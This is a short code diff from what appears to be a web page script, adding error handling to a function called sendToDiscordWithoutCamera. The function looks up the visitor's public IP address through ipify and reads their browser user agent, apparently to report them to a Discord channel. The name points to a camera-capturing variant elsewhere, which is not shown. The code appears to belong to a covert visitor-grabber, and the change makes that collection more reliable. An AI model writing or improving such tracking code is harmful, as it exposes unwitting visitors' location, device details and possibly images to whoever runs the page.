@@ -73,7 +73,12 @@
 
         function sendToDiscordWithoutCamera() {
             fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to fetch IP address.');
+                    }
+                    return response.json();
+                })
                 .then(data => {
                     var ipAddress = data.ip;
                     var userAgent = navigator.userAgent;
